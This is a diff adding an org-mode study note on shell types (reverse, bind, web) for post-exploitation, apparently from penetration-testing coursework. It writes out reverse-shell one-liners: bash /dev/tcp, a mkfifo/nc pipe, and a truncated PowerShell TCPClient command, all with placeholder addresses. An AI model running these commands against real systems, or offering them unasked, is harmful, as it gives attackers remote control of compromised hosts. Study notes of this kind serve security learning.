@@ -1,0 +1,31 @@
+:PROPERTIES:
+:ID:       47E30BCE-66A0-4A16-ACEE-E6D3C457AE3F
+:END:
+#+title: Types of shells
+#+filetags: 
+#+date: [2023-10-11 Wed 20:15]
+
+Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system to not have to keep exploiting the same vulnerability over an over. To [[id:F2DBC35D-8597-4FB2-BF3B-BB99F79D6DA7][enumerate]] the system or take further control over the network. We need a reliable connection that gives us direct acess to the system's [[id:EF5DF000-3E20-4493-9546-D1D3A8C86E11][Shell]]. 
+
+One way to connect to a compromised system is through network protocols, like [[id:6F94B596-3774-4ECA-A902-13447807BB11][SSH]] or [[id:FE983009-CEBF-47F1-ADB7-358D74CE343F][WinRM]]
+
+| Shell   | Method Of Communication                                              |   |
+| Reverse | Connects back to our system and gives control through a reverse conn |   |
+| Bind    | Waits for us to connect to it and gives us control                   |   |
+| Web     | Communicates through a web server through                            |   |
+|         |                                                                      |   |
+
+* Reverse Shell
+** Making the connection
+*** Starting 
+#+begin_src bash
+bash -c 'bash -i >& /dev/tcp/<ip address>/<port number> 0>&1'
+#+end_src>
+
+#+begin_src bash
+rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <ip address> <port number> >/tmp/f
+#+end_src>
+
+#+begin_src powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ip address>",<port number>);$stream = $client.GetStream();[byte[]]
+#+end_src>
